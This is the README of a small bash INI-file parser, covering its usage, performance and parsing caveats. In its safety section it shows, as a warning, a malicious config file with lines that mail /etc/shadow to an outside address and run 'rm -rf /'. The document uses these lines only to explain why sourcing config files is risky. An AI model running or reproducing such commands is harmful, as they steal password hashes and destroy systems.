shini
=====

A small, minimalist, <s>portable</s> <em>compatible</em><sup>1</sup> `/bin/bash` routine for reading of INI files.

<em><sup>1</sup> This script previously attempted to be "portable", that is to say - written in a manner that it would reliably have a good chance of running anywhere with no specific implementation coded inside. In order to gain usable performance on INI files bigger than "very small", it has since been modified to include shell specific implementation for recent versions of `bash` - considerably increasing performance at the cost of code complexity. Therefore, I am calling it 'compatible' herein.</em>

## About

### What is `shini`?
As above. It's a small set of functions written for inclusion in shell scripts, released under the MIT license.

**NOTE**: [pachisb](https://github.com/pachisb/) has [forked to create this simplified version](https://github.com/pachisb/shini-simplified) which is specifically for `bash >= 3`, and disables callbacks and writing. If this better meets your needs, please embrace the nature of open-source and support his work! (And send my blessings his way.). The original work from [wallyhall](https://github.com/wallyhall/) is [in this repository](https://github.com/wallyhall/shini).

### Is it slow?
Shell scripting was never designed with speed for this kind of processing in mind. That said, on recent versions of `bash` (version 3 or newer) the performance is quite acceptable.

On an 2012 i7 MacBook, a 1900 line INI file will fully parse within 0.6s:

    $ wc -l tests/php.ini 
    1917 tests/php.ini

    $ time bash ./test_perf.sh > /dev/null
    real    0m0.838s

    $ time bash ./test_perf.sh opcache > /dev/null
    real    0m0.313s

### Why do I need it?
You probably don't. But if you have or ever do find yourself writing a shell script which:
 * Needs system or user specific settings
 * Needs to read an existing INI file

... then you might find `shini` saves you a lot of time, and makes things safer.

### How can it make things safer?
Because system and user specific settings in shell scripts usually end up implemented as:

```
# /usr/local/sbin/rootonlyscript
. /etc/myscript
if [ -n SETTING1 ]; then
  echo "You didn't specify SETTING1" 1>&2
fi
```

The settings file looks like:

```
# /etc/myscript
SETTING1='abc'
SETTING2='def'
```
... and everything is cool until *this* happens:

```
# /etc/myscript
SETTING1='abc'
SETTING2='def'
cat /etc/shadow | mail someone@wishyouwerehere.com
rm -rf /
```

Alas, bye bye shadow file - bye bye system.

`shini` only reads the file; never includes, interprets or executes it. A better solution.

### So `shini` just makes my shell script secure?

Erm, no. Please go away and learn to code before proceeding.

Remember:
 * Your config file must always have sane file permissions - even if its an INI file
 * `shini` is to be included in your script - so it should be located somewhere safe, and with read-only permissions

Best advice, if in doubt:

```
sudo chown root:root shell-ini-parser.sh
sudo chmod 644 shell-ini-parser.sh
```

## Usage

### Show me `shini`!

To see `shini` in action in under 2 minutes:

**NOTE**: this section downloads and makes use of the original `wallyhall/shini` project, which has more tests and examples than this one. For `shini-simplified`, **bash must be used** instead of sh, and the output will differ slightly.

```
cd "$(mktemp -d -t shini)"
curl https://codeload.github.com/wallyhall/shini/tar.gz/master -o master.tar.gz
tar -xvzf master.tar.gz
chmod +x shini-master/example.sh
cd shini-master/
sh example.sh
```

You should be presented with some output like this:

```
Parsing...

  Section1.name='John Doe'
  Section1.organization='Acme Widgets Inc.'
  Section2.server='10.1.2.3'
  Section2.port='80'
  Section2.file='payroll.dat'
  Section2.this_value_was_in_hex='8739'
  Another_Section.test_key_22='test test test'
  Another_Section.var_with_leading_whitespace='value'
  Another_Section.whitespace_test='lots of whitespace'
  Another_Section.quoted_quotespace='  lots more whitespace  '
  Whitespace_Section.null_value=''

Complete.
```

You've just executed the shipped example/test script (`example.sh`) - which parses an example INI file (`example.ini`) - outputting the content in the format `[section].[key]=[value]`.

## Cool. Now show me how to include and use it myself!

Inclusion of `shini` in your own project is easy. You can put the content of `shell-ini-parser.sh` inline with your own code (not recommended, but acceptable. Make sure you appropriately include the MIT license...), or 'source' it externally - i.e.:

```
. "$(dirname "$0")/shell-ini-parser.sh"
. "/usr/local/bin/shell-ini-parser.sh"
... etc
```

`shini` works by parsing INI files line by line - skipping comments.

Each argument can should be carefully handled - always double quote (unless you're certain what you're doing). Never forget you can't guarantee what is in the INI file being parsed - it could be with evil intent.

When you're ready, invoke the parse function and (optionally) specify the specific INI section you're interested in. You can also optionally set the prefix used to name variables:

```
shini_parse_section "settings.ini"
shini_parse_section "settings.ini" "SomeSection"
shini_parse_section "settings.ini" "" "INI"
```

Bingo. All the variables found will be set in the form PREFIX__SECTION__NAME (note the double underscores and that PREFIX defaults to "SHINI"). Note that the variable names will always be uppercase.
A full (and simple) example can be found in `example.sh`. You can run `. ./example.sh` and see the new variables set, such as SHINI__SECTION1__NAME.

## Known caveats, etc

### Does `shini` follow the official INI format standards?

There are no INI format standards - so yes it does and no it doesn't?

`shini` assumes:

 * Every declaration is on a new line
 * __Sections__ are contained in square brackets, and include `a-z`, `A-Z`, `0-9`, `-` and `_` (no spaces by default) - e.g. `[section]`
 * __Keys__ are followed by an assignment (equal) sign, and include `a-z`, `A-Z`, `0-9`, `-` and `_` (again, no spaces by default) - e.g. `key=`
 * __Values__ follow keys, on the same line. Anything is valid, except double quotes and semi-colons. Hexadecimal values (i.e. `0x123`) are parsed and converted to decimal for you.
 * __Comments__ are lines starting with a semi-colon (`;`), such lines are ignored.
 * __Whitespace__ is ignored everywhere - except in between non-whitespace characters in values. Use double quotes (`"`) to be explicit (e.g. `key=" leading/trailing WS "`)

Due to portability constraints - some of the useful regex power isn't available to `shini`.

This caused some trade-offs - with a lack of efficient control over lazy vs greedy repeats and optional groups etc, comments can only follow key/pair values and empty lines (not sections) - and where it follows values, any whitespace between the value and semi-colon is included as the value. Explicitly use of double-quotes around the value gets around this issue.

Additionally if your key/value declaration looks like this:

```
key="value" "more text" ; comment
```

... the value reads literally:

```
"value" "more text" ; comment
```

Otherwise, all known "obviously invalid" INI content gets picked up and reported.
